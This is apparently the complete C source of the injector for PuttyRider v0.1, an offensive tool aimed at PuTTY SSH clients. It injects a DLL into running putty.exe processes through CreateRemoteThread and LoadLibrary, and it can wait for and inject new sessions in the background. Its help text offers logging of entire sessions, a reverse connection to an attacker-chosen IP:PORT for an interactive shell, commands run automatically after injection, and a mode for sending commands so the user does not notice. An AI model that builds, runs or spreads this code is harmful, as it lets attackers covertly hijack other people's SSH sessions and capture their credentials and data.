#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h> 
#include <assert.h>
#include <shlwapi.h>
#include <shellapi.h>
#include "Utils.h"
#include "Wingetopt.h"

/* Pointers to exported DLL functions used for setting parameters */
VOID (*SetLogFileName)(UCHAR*);
VOID (*SetDefaultCmd)(UCHAR*);
VOID (*SetConnectBackInfo)(CHAR*, DWORD);
BOOL (*EjectDLL)(UINT);

typedef struct {
	DWORD	processID;
	UCHAR*	procName;
	UCHAR*	dllName;
} InjectorThreadArgs;

/* Injects a DLL into the process identified by processID
 */
BOOL InjectDLL(DWORD processID, CHAR* procName, CHAR* dllName)
{
	HANDLE	hProc; 
	LPVOID	pLoadLibrary;
	LPVOID	pRemoteDLLName;
	HANDLE	hRemoteThread;
	CHAR	errorText[256];
	DWORD	exitCode = 0;

	/* These should be the minimum privileges required */
	#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ) 
	
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, processID); 
	if (hProc == NULL) {
		printf("[-] Could not open process %s\n", procName);
		return FALSE;
	}

	pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"); 
	if (pLoadLibrary == NULL) {
		printf("[-] Could not get pointer to LoadLibrary\n");
		return FALSE;
	}
	
	pRemoteDLLName = (LPVOID)VirtualAllocEx(hProc, NULL, MAX_PATH, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteDLLName == NULL) {
		printf("[-] Could not allocate memory for DLL name\n");
		return FALSE;	
	}
	
	WriteProcessMemory(hProc, pRemoteDLLName, dllName, lstrlen(dllName), NULL); 
	
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteDLLName, 0, NULL);
	if (hRemoteThread == NULL) {
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 
					  MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), errorText, 256, NULL);	
		printf("[-] Could not create remote thread: %s\n", errorText);
		return FALSE;
	}
    	
	CloseHandle(hRemoteThread);
	CloseHandle(hProc); 
	
	return TRUE;
}

/* Call the exported method EjectDLL from the remote DLL
 */
BOOL EjectSingleDLL(DWORD processID, UCHAR* dllName)
{
	HANDLE	hProc;
	HANDLE	hRemoteThread;

	printf("[+] Ejecting from Putty.exe pid=%i", processID);
	if (IsDllLoaded(processID, dllName)) {

		hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, processID); 
		if (hProc == NULL) {
			printf(" - Failed\n");
			printf("[-] Could not open process with pid=%i\n", processID);
			return FALSE;
		}
		
		hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)EjectDLL, 0, 0, NULL);
		WaitForSingleObject(hRemoteThread, INFINITE);
		CloseHandle(hRemoteThread);

		printf(" - Success\n");	
	} else {
		printf(" - DLL not loaded\n");	
	}
	return TRUE;
}


/* Enumerate all processes identified by procName and call EjectSingleDLL()
 */
BOOL EjectAllDLLs(UCHAR* procName, UCHAR* dllName)
{
	PROCESSENTRY32	pe; 
	HANDLE 			hSnapshot; 
	BOOL 			retVal;
	BOOL			bProcFound = FALSE;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
	if(hSnapshot == INVALID_HANDLE_VALUE) { 
		printf("[-] Failed to create snapshot of running processes\n"); 
		return FALSE; 
	}

	pe.dwSize = sizeof(PROCESSENTRY32);
	retVal = Process32First(hSnapshot, &pe); 

	while(retVal) { 
		if(StrStrI(pe.szExeFile, procName) != NULL) { 
			EjectSingleDLL(pe.th32ProcessID, dllName); 
			bProcFound = TRUE;
		}
		retVal	= Process32Next(hSnapshot,&pe); 
		pe.dwSize = sizeof(PROCESSENTRY32); 
	}

	if (bProcFound == FALSE) {
		printf("[-] No process found - %s\n", procName); 
		return FALSE; 		
	}
	return TRUE;
}


/* Load the DLL into the address space of the current process in order to transmit 
 * some parameters to the remote DLL via the shared data segment of the DLL
 * Parameters will be set using the corresponding functions exported by the DLL
 */
HINSTANCE InitializeDLL(CHAR* dllName)
{
	HINSTANCE hDLL;
	if ((hDLL = LoadLibrary(dllName)) == NULL) {
		printf("[-] Could not load the DLL into our own address space\n");
		return NULL;
	}
	SetLogFileName = (VOID (*)(UCHAR*))GetProcAddress(hDLL, "SetLogFileName");
	if (SetLogFileName == NULL) {
		printf("[-] Could not find SetLogFileName\n");
		return NULL;	
	}
	SetDefaultCmd = (VOID (*)(UCHAR*))GetProcAddress(hDLL, "SetDefaultCmd");
	if (SetDefaultCmd == NULL) {
		printf("[-] Could not find SetDefaultCmd\n");
		return NULL;	
	}
	SetConnectBackInfo = (VOID (*)(CHAR*, DWORD))GetProcAddress(hDLL, "SetConnectBackInfo");
	if (SetConnectBackInfo == NULL) {
		printf("[-] Could not find SetConnectBackInfo\n");
		return NULL;	
	}
	EjectDLL = (BOOL (*)(UINT))GetProcAddress(hDLL, "EjectDLL");
	if (EjectDLL == NULL) {
		printf("[-] Could not find EjectDLL\n");
		return NULL;
	}
	return hDLL;
}

DWORD WINAPI RunInjectorThread(LPVOID lpParam)
{
	InjectorThreadArgs 	ita 					= *((InjectorThreadArgs*)lpParam);
	DWORD 				processID 				= ita.processID;
	
	if ((INT)processID >= 0 ) {
		if (processID == 0) {
			printf("[+] Searching for a Putty process...\n");
			/* Search for target process */
			processID = GetPidFromProcname(ita.procName);
			if (processID == 0) {
				printf("[-] Could not find process %s\n", ita.procName);
				return 0;
			}
		}
		printf("[+] Using putty.exe PID=%i\n", processID);		
		printf("[+] Injecting DLL...\n");
		if (InjectDLL(processID, ita.procName, ita.dllName) == FALSE) {
			return 0;
		}
	} else {
		printf("[+] Waiting for Putty process...\n");
		
		while (TRUE) {
			processID = GetPidNotInjected(ita.procName, ita.dllName);
			if (processID != 0) {
				printf("[+] Putty PID=%i\n", processID);
				printf("[+] Injecting DLL...\n");
				InjectDLL(processID, ita.procName, ita.dllName);
			}
			Sleep(100);
		}
	}
	
	return 0;
}


VOID PrintHelp(CHAR* progName)
{
	printf("\n\
Usage: %s [options]\n\
\n\
Options:\n\
\n\
  Operation modes:\n\
    -l      List the running Putty processes and their connections\n\
    -w      Inject in all existing Putty sessions and wait for new sessions\n\
            to inject in those also\n\
    -p PID  Inject only in existing Putty session identified by PID.\n\
            If PID==0, inject in the first Putty found\n\
    -x      Cleanup. Remove the DLL from all running Putty instances\n\
    -d      Debug mode. Only works with -p mode\n\
    -c CMD  Automatically execute a Linux command after successful injection\n\
            PuttyRider will remove trailing spaces and '&' character from CMD\n\
            PuttyRider will add \" 1>/dev/null 2>/dev/null &\" to CMD\n\
    -h      Print this help\n\
\n\
  Output modes:\n\
    -f          Write all Putty conversation to a file in the local directory.\n\
                The filename will have the PID of current putty.exe appended\n\
    -r IP:PORT  Initiate a reverse connection to the specified machine and\n\
                start an interactive session.\n\
\n\
  Interactive commands (after you receive a reverse connection):\n\
    !status     See if the Putty window is connected to user input\n\
    !discon     Disconnect the main Putty window so it won't display anything\n\
                This is useful to send commands without the user to notice\n\
    !recon      Reconnect the Putty window to its normal operation mode\n\
    CMD         Linux shell commands\n\
    !exit       Terminate this connection\n\
    !help       Display help for client connection\n\
\n\
	", progName);
	
}

BOOL RestartProcessDetached(INT argc, CHAR** argv)
{
	DWORD 				dwCreationFlags = CREATE_DEFAULT_ERROR_MODE | DETACHED_PROCESS;
	STARTUPINFO 		startinfo;
	PROCESS_INFORMATION procinfo;
	CHAR				cmdLine[MAX_PATH] = "";
	INT					i;
	
	for (i = 0; i < argc; i++) {
		strcat(cmdLine, argv[i]);
		strcat(cmdLine, " ");
	}

	ZeroMemory(&startinfo, sizeof(startinfo));
	startinfo.cb = sizeof(startinfo);
	return CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &startinfo, &procinfo);
}

VOID main(INT argc, CHAR** argv)
{
	CHAR*				procName 				= "putty.exe";
	CHAR				dllName[MAX_PATH] 		= "PuttyRider.dll";
	CHAR				logFileName[MAX_PATH]	= "PuttyRider.log";
	CHAR				workingDir[MAX_PATH];
	HANDLE 				logPipe;
	HANDLE				hDLL;
	CHAR				buffer[BUFSIZE];
	DWORD				PIPE_TIMEOUT_CONNECT	= 3000; 			/* Wait 3 seconds for injected DLL to connect back to pipe */
	OVERLAPPED 			overlapped 				= {0,0,0,0,NULL};
	BOOL				bRet;
	HANDLE				hInjectorThread			= NULL;	/* Handle to the injector thread */
	InjectorThreadArgs 	ita;
	CHAR				connectBackIP[BUFSIZE];
	DWORD				connectBackPort;

	
	/* Command line arguments */
	INT					processID				= -1;	/* pid == -1 	=> no pid specified (equivalent with bWait == TRUE)
														   pid == 0 	=> inject in first Putty found 
														   pid > 0		=> inject in Putty pid 
														*/
	BOOL				bWait					= FALSE;
	BOOL				bDebug					= FALSE;
	CHAR				defaultCmd[MAX_PATH]	= "";
	BOOL 				bListPuttys				= FALSE;
	BOOL				bWriteFile				= FALSE;
	BOOL				bCleanup				= FALSE;
	CHAR				connectBackInfo[BUFSIZE] = "";
	INT					opt;

	/* Disable output buffering */
	setbuf(stdout, NULL);
	
	/* Print banner */
	printf("\n\nPuttyRider v0.1\n===============\n\n");
	
	/* Parse the comand line arguments */
	while ((opt = getopt(argc, argv, "wp:dc:sxfr:lh")) != -1) {
		switch (opt) {
			case 'w':
				bWait = TRUE;
				break;
			case 'p':
				if (sscanf(optarg, "%d", &processID) == 0) {
					printf("[-] Incorrect value for pid. Must be an integer\n");
					PrintHelp(argv[0]);
					return;
				}
				if (processID < 0 || processID > 65535) {
					printf("[-] Incorrect value for pid. Must be in range 0..65535\n");
					PrintHelp(argv[0]);
					return;				
				}
				break;
			case 'd':
				bDebug = TRUE;
				break;
			case 'c':
				/* Leave space for modifiers added by the DLL to the command */
				strncat(defaultCmd, optarg, BUFSIZE-100);
				break;
			case 'x':
				bCleanup = TRUE;
				break;
			case 'f':
				bWriteFile = TRUE;
				/* Prepend the current directory to log filename */
				GetCurrentDirectory(MAX_PATH-strlen(logFileName)-2, workingDir);
				strncpy(buffer, logFileName, BUFSIZE);
				sprintf(logFileName, "%s\\%s", workingDir, buffer);
				break;
			case 'r':
				strncat(connectBackInfo, optarg, BUFSIZE-1);
				/* Parse the IP:PORT format */
				if (ParseIPPort(connectBackInfo, connectBackIP, &connectBackPort) == FALSE) {
					PrintHelp(argv[0]);
					return;
				}
				break;
			case 'l':
				bListPuttys = TRUE;
				break;
			case 'h':
				PrintHelp(argv[0]);
				return;
				
			case '?':
				if (optopt == 'p' || optopt == 'c' || optopt == 'r')
					printf("[-] Option -%c requires an argument\n", optopt);
				else 
					printf("[-] Unknown option '-%c'\n", optopt);
				PrintHelp(argv[0]);
				return;
				
			default:
				printf("[-] Invalid arguments\n");
				PrintHelp(argv[0]);
				return;
		}
	}

	/* Check if arguments have been supplied correctly */
	if (bWait == FALSE && processID == -1 && bListPuttys == FALSE && bCleanup == FALSE) {
		printf("[-] Operation mode must be specified (-w or -p or -l or -x)\n");
		PrintHelp(argv[0]);
		return;
	}
	
	if (bWait == TRUE && processID >= 0) {
		printf("[-] Options -w and -p cannot be both be set. Please choose only one\n");
		PrintHelp(argv[0]);
		return;
	}

	if (bWriteFile == FALSE && strlen(connectBackInfo) == 0 && bListPuttys == FALSE && bCleanup == FALSE) {
		printf("[-] Output mode must be specified (-f or -r)\n");
		PrintHelp(argv[0]);
		return;
	}
	

	/* If we are in -w mode and we're attached to console, restart the process detached from console */
	if (bWait == TRUE && GetStdHandle(STD_OUTPUT_HANDLE) != 0) {
		printf("[+] Waiting for new Putty processes (in background)...\n");

		if (bWriteFile == TRUE) {
			printf("[+] Check the log file: %s\n", logFileName);
		}
		if (strlen(connectBackInfo) > 0) {
			printf("[+] Check the connection on: %s:%i\n", connectBackInfo, connectBackPort);
		}
		
		if (RestartProcessDetached(argc, argv) == FALSE) {
			printf("[-] Restarting process in background has failed");
		}
		return;
	}	
	
	/* Initialize the remote DLL by first loading it into our own address space */
	if ((hDLL = InitializeDLL(dllName)) == NULL) {
		return;
	}

	/* Overwrite the DLL name with its full path */
	GetModuleFileName(hDLL, dllName, MAX_PATH);

	if (bListPuttys == TRUE) {
		printf("[+] Listing running Putty processes...\n");
		ListPuttyProcesses(procName, dllName);
		return;
	}

	if (bCleanup == TRUE) {
		printf("[+] Removing DLL from all Putty processes...\n");
		EjectAllDLLs(procName, dllName);
		return;
	}	
	
	if (bWriteFile == TRUE) {
		SetLogFileName(logFileName);
	}

	if (strlen(defaultCmd)) {
		SetDefaultCmd(defaultCmd);
	}
	
	if (strlen(connectBackInfo) > 0) {
		SetConnectBackInfo(connectBackIP, connectBackPort);
	}
			
	if (bWait == FALSE) {	
		/* Create a pipe for receiving log messages from remote DLL */
		logPipe = CreateNamedPipe("\\\\.\\pipe\\pr_log", PIPE_ACCESS_INBOUND|FILE_FLAG_OVERLAPPED, 
								PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT|PIPE_REJECT_REMOTE_CLIENTS, 
								PIPE_UNLIMITED_INSTANCES, BUFSIZE, BUFSIZE, PIPE_TIMEOUT_CONNECT, NULL);
		if (logPipe == INVALID_HANDLE_VALUE) {
			printf("[-] Could not create named pipe\n");
			PrintLastError();
			return;	
		}
	}
	
	/* Create the injector thread */		
	ita.processID 	= processID;
	ita.procName	= procName;
	ita.dllName		= dllName;
		
	hInjectorThread = CreateThread(NULL, 0, RunInjectorThread, &ita, 0, NULL);
	if (hInjectorThread == NULL) {
		printf("[-] Creating injector thread failed\n");
		return;
	}
	
	if (bWait == FALSE) {
		/* Start communicating with remote thread */
		overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		bRet = ConnectNamedPipe(logPipe, &overlapped);
		if (bRet == FALSE) {
			
			switch (GetLastError()) {
				case ERROR_PIPE_CONNECTED:
					/* Client is connected */
					bRet = TRUE;
					break;
		 
				case ERROR_IO_PENDING:
					/* If pending, wait PIPE_TIMEOUT_CONNECT ms */
					if (WaitForSingleObject(overlapped.hEvent, PIPE_TIMEOUT_CONNECT) == WAIT_OBJECT_0) {
						DWORD dwIgnore;
						bRet = GetOverlappedResult(logPipe, &overlapped, &dwIgnore, FALSE);
					} else {
						CancelIo(logPipe);
					}
				break;
			}
		}
		CloseHandle(overlapped.hEvent);

		/* Check if the any client has connected */
		if (bRet == FALSE) {
			printf("[-] DLL injection failed (Pipe connection timed out)\n");
			printf("    Are you already injected in this Putty process?\n");
		} else {
			printf("[+] Pipe client connected\n");

			while (TRUE) {
				if (ReadPipeMessage(logPipe, buffer) == FALSE) {
					printf("[-] Pipe read failed\n");
					break;
				}
				if (strstr(buffer, "!consoledetach") != 0) {
					if (bDebug == FALSE) {
						break;
					}
				}
				printf("%s", buffer);
				Sleep(50);
			}

			printf("[+] Check the log file and/or the remote connection handler\n");		
		}
	}
		
	WaitForSingleObject(hInjectorThread, INFINITE);
	
	DisconnectNamedPipe(logPipe);
	FreeLibrary(hDLL);
	
	printf("[+] Exiting PuttyRider\n");
}

